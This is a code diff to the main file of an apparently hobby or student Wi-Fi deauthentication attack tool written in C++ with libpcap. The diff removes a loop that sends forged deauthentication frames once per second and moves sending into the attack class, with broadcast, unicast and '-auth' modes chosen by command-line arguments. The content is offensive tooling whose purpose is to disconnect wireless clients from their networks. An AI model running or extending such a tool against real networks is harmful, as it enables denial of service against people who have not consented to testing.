@@ -1,6 +1,4 @@
 #include <iostream>
-#include <pcap.h>
-#include <unistd.h>
 #include "CDeauthAttack.h"
 
 void usage()
@@ -13,17 +11,6 @@ void printErrorInterface(char* strErr)
 {
     std::cerr << strErr << std::endl;
     std::cerr << "Check  Interface Or Permission" << std::endl;
-}
-
-void sendPacket(pcap_t* handle, CDeauthenticationAttack* deauth)
-{
-    while(true)
-    {
-        BYTE* packet = deauth->getDeauthenticationPacket();
-        int len = deauth->getDeauthenticationPacketSize();
-        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), len);
-        sleep(1);
-    }
 }
 
 int main(int argc, char* argv[])
@@ -47,25 +34,31 @@ int main(int argc, char* argv[])
     
     CDeauthenticationAttack* deauth;
     
-    // BroadCast
     switch (argc)
     {
     case 3: // BroadCast
-        deauth = new CDeauthenticationAttack(argv[2]);
+        deauth = new CDeauthenticationAttack(0);
+        deauth->sendPacket(handle, argv[2], NULL, 0);
         break;
     
     case 4: // Unicast
-        deauth = new CDeauthenticationAttack(argv[2], argv[3]);
+        deauth = new CDeauthenticationAttack(1);
+        deauth->sendPacket(handle, argv[2], argv[3], 1);
         break;
     
     case 5: // Auth
-
+        if(strcmp(argv[4],"-auth"))
+        {
+            usage();
+            return -1;
+        }
+        deauth = new CDeauthenticationAttack(2);
+        deauth->sendPacket(handle, argv[2], argv[3], 2);
         break;
     default:
         usage();
         return -1;
     }
 
-    sendPacket(handle, deauth);
     return 0;
 }
